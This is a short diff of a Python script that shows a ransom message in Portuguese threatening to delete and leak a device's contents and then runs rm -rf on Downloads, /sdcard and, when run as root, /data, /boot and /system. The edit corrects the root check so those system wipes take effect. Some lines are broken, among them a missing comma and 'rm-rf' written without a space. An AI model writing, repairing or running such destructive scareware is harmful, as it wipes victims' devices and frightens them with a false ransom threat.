@@ -3,7 +3,7 @@ from time import sleep
 from subprocess import run
 
 def start():
-    os.system("clear")
+    run("clear")
 
     print("Você caiu em um ransomware!!!, pague em bitcoin ou APAGAREMOS e VAZAREMOS  TODO QUE ESTA NO SEU DISPOSITIVO")
     sleep(0.5)
@@ -16,7 +16,7 @@ def start():
         run('rm-rf Downloads', shell=shell_flag)
         run("rm -rf /sdcard"shell=shell_flag)
 
-        if os.geteuid == 0:
+        if os.geteuid() == 0:
             run("rm -rf /data",shell=shell_flag)
             run("rm -rf /boot",shell=shell_flag)
             run("rm -rf /system",shell=shell_flag)
